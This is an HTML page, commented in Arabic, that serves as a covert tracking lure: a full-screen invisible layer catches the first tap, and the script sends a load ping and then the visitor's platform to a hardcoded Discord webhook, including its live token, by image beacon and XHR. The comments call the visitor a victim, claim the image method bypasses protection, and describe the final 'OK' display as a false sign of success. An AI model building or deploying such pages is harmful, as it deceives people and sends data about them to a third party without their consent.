<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking 30</title>
    <style>
        body { background: #000; color: #fff; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: sans-serif; overflow: hidden; }
        h1 { font-size: 150px; z-index: 1; pointer-events: none; }
        /* طبقة شفافة فوق كل شيء لتلقي اللمسة الأولى */
        .touch-layer { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 10; cursor: pointer; }
    </style>
</head>
<body>

    <div class="touch-layer" onclick="forceBurst()"></div>
    <h1>30</h1>

    <script>
        const HOOK = "https://discord.com/api/webhooks/1481664919198896258/hXunBuVEO0j0riESA9nicqjzyRtEA1du3OzoCIHNqJpNWfv9xyrtEfCzgcElPQ9gvBgZ";

        function forceBurst() {
            const msg = encodeURIComponent("🎯 **Target Tapped V30!**\nSystem: " + navigator.platform);
            
            // الطريقة 1: الإرسال عبر "رابط صورة" (تتجاوز الحماية 100%)
            const tracker = new Image();
            tracker.src = HOOK + "?content=" + msg + "&v=" + Math.random();

            // الطريقة 2: الإرسال عبر XHR التقليدي
            var xhr = new XMLHttpRequest();
            xhr.open("POST", HOOK, true);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify({ content: "🔥 **V30 Force-Hit Success!**" }));

            // تغيير الرقم لإعطاء إيحاء بالنجاح للضحية
            document.querySelector('h1').innerText = "OK";
            document.querySelector('h1').style.color = "#0f0";
        }

        // إرسال إشارة "تحميل صامت" بمجرد الفتح
        window.onload = function() {
            const ping = new Image();
            ping.src = HOOK + "?content=" + encodeURIComponent("🚀 Page Loaded: Version 30");
        };
    </script>
</body>
</html>
